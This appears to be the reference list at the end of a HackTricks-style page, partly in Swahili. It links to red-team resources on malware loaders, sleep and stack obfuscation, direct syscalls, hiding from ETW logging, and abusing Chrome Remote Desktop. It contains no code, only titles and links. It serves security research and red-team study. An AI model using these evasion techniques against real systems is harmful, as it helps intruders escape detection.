- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, na Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia vibaya Chrome Remote Desktop katika shughuli za Red Team: Mwongozo wa vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
